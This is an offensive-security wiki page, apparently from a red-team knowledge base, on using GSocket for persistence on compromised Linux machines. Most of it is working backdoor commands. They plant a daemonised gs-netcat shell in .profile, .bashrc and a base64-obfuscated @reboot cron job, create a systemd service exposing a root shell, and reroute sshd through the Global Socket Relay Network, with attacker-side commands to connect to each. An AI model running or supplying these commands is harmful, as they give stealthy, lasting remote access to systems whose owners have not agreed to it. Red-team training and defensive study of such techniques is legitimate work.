---
description: MITRE ATT&CK™ Persistence - Tactic TA0003
---

# GSocket for Persistence

## Theory

[**GSocket**](https://github.com/hackerschoice/gsocket) is a networking utility designed to facilitate secure and transparent TCP connections between hosts, even when they are behind Network Address Translation (NAT) devices or firewalls. It achieves this by leveraging the **Global Socket Relay Network (GSRN)**, enabling seamless and encrypted communication without requiring direct IP address visibility.

**Key Features**:

* **Firewall and NAT Traversal**: GSocket allows connections between hosts without modifying firewall settings, making it ideal for environments with strict network controls.
* **End-to-End Encryption**: Utilizing OpenSSL's Secure Remote Password (SRP) protocol, GSocket ensures that all data transmitted between hosts is securely encrypted.  GSRN acts as an intermediary, forwarding encrypted traffic between endpoints.
* **No Fixed IPs**: Instead of a known destination address, each peer connects to GSRN and advertises itself using a **cryptographic identifier derived from the shared password**. Two machines using the same password can **automatically find each other** via GSRN, even if their IP addresses change.

These features make **GSocket** a powerful tool for establishing resilient persistence on compromised endpoints.

## Practice

{% hint style="success" %}
You can directly generate secrets using the `gsocket -g` command
{% endhint %}

{% tabs %}
{% tab title="Persistence Script" %}
We may creates a **persistence script** that launches **GSocket** and provides a bind shell. The script can be placed in **user profile scripts** (`.bashrc`, `.profile`) or **cron jobs** for execution at login or system boot.

On the target machine, we can use following commands:

```bash
# Simple Persistence Command for reverse shell over GSRN
# gs-netcat
# -s: Secret (password)
# -l: listening mode
# -q: Quiet mode
# -D: Deamon & Watchdog mode
killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s ExampleSecretChangeMe -liqD" SHELL=/bin/bash exec -a -bash gs-netcat)

# We can append this command to user profile scripts
echo 'killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s ExampleSecretChangeMe -liqD" SHELL=/bin/bash exec -a -bash gs-netcat)' >> /home/targetUser/.profile
echo 'killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s ExampleSecretChangeMe -liqD" SHELL=/bin/bash exec -a -bash gs-netcat)' >> /home/targetUser/.bashrc

# Alternatively base64 this payload and insert it into crontab
(crontab -l 2>/dev/null; echo "@reboot bash -c 'eval \$(echo a2lsbGFsbCAtMCBncy1uZXRjYXQgMi4vZGV2L251bGwgfHwgKEdTT0NLRVRfQVJHUz0iLXMgRXhhbXBsZVNlY3JldENoYW5nZU1lIC1saXFEIiBTSEVM... | base64 -d)'" ) | crontab -
```

We can now connect to the shell from our attacking box as follows:

```bash
# -s: Secret (password)
# -i: Interactive shell
# -T: Connect via TOR
gs-netcat -s ExampleSecretChangeMe -i
```
{% endtab %}

{% tab title="Systemd Persistence" %}
We may use GSocket as a systemd service, ensuring it automatically starts upon reboot, and provide us a persistent backdoor access.

On the victime, create _`/etc/systemd/system/gs-root-shell.service`_:

{% hint style="info" %}
`-k`: is too read the secret from file.

Replave with `-s "MyPassword"` to directly provide the secret.&#x20;
{% endhint %}

```systemd
[Unit]
Description=Global Socket Root Shell
After=network.target

[Service]
Type=simple
Restart=always
RestartSec=10
WorkingDirectory=/root
ExecStart=gs-netcat -k /etc/systemd/gs-root-shell-key.txt -il

[Install]
WantedBy=multi-user.target
```

On the target we can now start and enable the service

```bash
# Start service
systemctl start gs-root-shell

# Enable it
systemctl enable gs-root-shell
```

We can now connect to the target from our attacking machine as follows:

```bash
gs-netcat -s ExampleSecretChangeMe -i
```
{% endtab %}

{% tab title="SSH-Based Persistence" %}
We can utilize GSocket along with SSHd to seamlessly route SSH traffic through the Global Socket Relay Network, and gain persistent access.

{% hint style="info" %}
Simple POC, that you may  addapt:&#x20;

```bash
# On target
gsocket -s ExampleSecretChangeMe /usr/sbin/sshd -D

# On attacking box
gsocket -s ExampleSecretChangeMe ssh user@target.com
```
{% endhint %}

Let's create a new SSHd service that will this time run over GSRN. On victime:

```bash
# Copy SSHd Service File (as root)
cp /etc/systemd/system/sshd.service /etc/systemd/system/gs-sshd.service
chmod 600 /etc/systemd/system/gs-sshd.service

# Edit the ExecStart option
sed -i 's|ExecStart=/usr/sbin/sshd -D $SSHD_OPTS|ExecStart=gs -s ExampleSecretChangeMe /usr/sbin/sshd -D $SSHD_OPTS|' /etc/systemd/system/gs-sshd.service

# Enable service
systemctl start gs-sshd
systemctl enable gs-sshd
```

We can now access our SSH server as follows from our attacking machine

```bash
gsocket -s ExampleSecretChangeMe ssh user@target.com
```
{% endtab %}
{% endtabs %}





## Resources

{% embed url="https://github.com/hackerschoice/gsocket" %}

{% embed url="https://www.gsocket.io/" %}
